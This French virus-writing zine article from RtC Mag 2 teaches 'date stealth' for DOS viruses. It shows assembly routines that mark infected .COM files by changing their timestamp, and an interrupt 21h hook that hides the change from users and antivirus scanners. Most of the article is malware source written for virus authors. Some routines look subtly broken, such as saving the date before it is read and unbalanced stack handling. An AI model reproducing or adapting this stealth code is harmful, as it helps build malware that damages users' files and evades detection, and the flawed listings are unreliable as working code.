@@ -1,0 +1,146 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  Date stealth  ]
+---------[ in RtC mag 2 ]
+----[  by Androgyne <androgyne-rtc@fr.st>  ]
+
+
+-------[  1) Technique de reconnaissance des fichiers infectés
+
+
+	Une bonne méthode de reconnaissance des fichiers infectés consiste à changer sa date. Cette méthode est non seulement simple mais ne nécessite pas toute une artillerie d'instructions assembleur. Pour vérifier si le fichier est infecté, on utilise une routine du style de celle qui suit (le fichier aura été ouvert auparavant et l'handle du fichier mis dans bx) :
+
+--- IS_INFECTED ---------------------------------------------------------------
+
+IS_INFECTED:
+        mov al,0
+        mov ah,57h
+        int 21h                        ;récupération de la date
+        cmp dx,????h                   
+        ret
+
+--- IS_INFECTED ---------------------------------------------------------------
+
+	????h désigne la date du fichier selon 512*(Année-1980)+32*Mois+Jour. Ainsi, 26 Avril 1986 (date de l'explosion de la centrale de Tchernobyl) se code 512*(1986-1980)+32*4+26=3226=0C9Ah, et voilà...
+	Au cours de l'infection, on rajoute juste ces quelques lignes qui change la date à la date souhaitée (ne jamais oublier que plus la date est ancienne, moins vous rencontrerez des fichiers naturellement immunisés) :
+
+--- CHANGE_DATE ---------------------------------------------------------------
+
+CHANGE_DATE:
+        mov al,0
+        mov ah,57h
+        int 21h                        ;récupération de la date
+        mov dx,????h
+        mov al,1
+        mov ah,57h
+        int 21h                        ;et changement de date
+	ret
+
+--- CHANGE_DATE ---------------------------------------------------------------
+
+
+
+-------[  2) Furtivité pour les virus résidants
+
+
+	Maintenant, cette méthode a un petit inconvénient. Les antivirus n'auront plus qu'à regarder la date pour voir si un fichier est infecté. Il faut donc utiliser des techniques de furtivité. La furtivité consiste à faire croire à l'utilisateur et aux antivirus que le fichier n'a pas été modifié. Classiquement, quand on veut se rendre furtif, on essaie surtout de cacher la taille réelle du fichier infecté (ce genre de furtivité est traité dans le Billy Becebu Virus Writing Guide). Ce qui nous intéresse ici, c'est de masquer la date que nous avons changée.
+	Nous utilisons le fait d'être résidant, comme nous avons détourné l'interruption 21h, il faut renvoyer la date originale à l'appel de l'interruption 21h fonction 57h. Il faut alors faire deux choses : modifier les deux routines précédentes pour prendre en compte qu'on est résidant et ajouter la routine de furtivité au gestionnaire de l'interruption 21h.
+	Voici d'abord la routine IS_INFECTED corrigée :
+
+--- IS_INFECTED ---------------------------------------------------------------
+
+IS_INFECTED:
+        mov al,0
+        mov ah,57h
+        pushf
+        call dword ptr cs:[Old_21]                 ;récupération de la date
+        cmp dx,????h                   
+        ret
+
+--- IS_INFECTED ---------------------------------------------------------------
+
+	et la routine CHANGE_DATE corrigée :
+
+--- CHANGE_DATE ---------------------------------------------------------------
+
+CHANGE_DATE:
+        mov al,0
+        mov ah,57h
+        mov [Date_Save],dx
+        pushf
+        call dword ptr cs:[Old_21]                 ;récupération de la date
+        mov dx,????h
+        mov al,1
+        mov ah,57h
+        pushf                                      ;et changement de date
+	call dword ptr cs:[Old_21]
+	ret
+
+Date_Save dw 0
+
+--- CHANGE_DATE ---------------------------------------------------------------
+
+    Alors se pose un problème crucial... Quand, on ouvre un fichier, on peut a priori savoir s'il est infecté ou non. Le problème est alors de récupérer la date d'origine car on ne sait absolument pas où se trouve le buffer Date_Save dans le fichier. Ce problème est-il insoluble ? Non évidemment, car la plupart des virus infecte les .com en se copiant à la fin et en rajoutant un saut au début du .com (cf Trivial K-os). On peut alors placer le buffer juste après le saut (i.e. à l'offset 103h car un .com s'exécute toujours à partir de l'offset 100h et un saut est codé en 3 octets). Et on y accède en plaçant le pointeur de fichier sur cet emplacement mémoire, on le lit et bingo ! Je vous laisse alors modifier la routine CHANGE_DATE de façon à placer la date originale là où il faut. Voilà alors à quoi ressemble la routine de furtivité dans le gestionnaire d'interruption :
+
+--- NEW_INT_21 ----------------------------------------------------------------
+
+NEW_INT_21:
+	cmp ax,5700h
+	jz DATE_HOOK
+	...
+
+DATE_HOOK:
+	push ax
+	push cx
+	push dx
+
+	pushf
+	call dword ptr cs:[Old_21]
+	cmp dx,????h
+	jnz END_HOOK
+
+	push ax
+	push cx
+	push dx
+
+	mov al,0
+	xor cx,cx
+	mov dx,3
+	mov ah,42h
+	pushf
+	call dword ptr cs:[Old_21]
+
+	mov cx,2
+	mov dx,offset Original_Date
+	mov ah,3Fh
+	pushf
+	call dword ptr cs:[Old_21]
+
+	pop dx
+	pop cx
+	pop ax
+
+	pushf
+	call dword ptr cs:[Old_21]
+	mov word ptr dx,[Original_Date]
+
+	pop dx
+	pop cx
+	pop ax
+
+	pushf
+	call dword ptr cs:[Old_21]
+
+  END_HOOK:
+	ret
+
+
+Original_Date dw 0
+
+--- NEW_INT_21 ----------------------------------------------------------------
+
+	Ainsi, toute tentative de lecture de la date par un programme étranger renverra la date originale, comme si le virus ne l'avait pas infecté. Tout cela peut paraître un peu dur mais je peux vous assurer que c'est une protection élémentaire pour rester dans l'ombre le plus longtemps possible.
+	Plus simplement, on aurait pu avancer la date d'une centaine d'année. Ansi tout programme ayant une date au delà de 2080 sera un programme infecté, il suffit alors d'enlever 100 à l'année et de la renvoyer, ce qui ne nécessite plus tous les jonglages que nous avons mis en place. Mais imaginez le plaisir que vous avez à redater tous les .com à la date de votre anniversaire...
+
+
+-------[  EOF
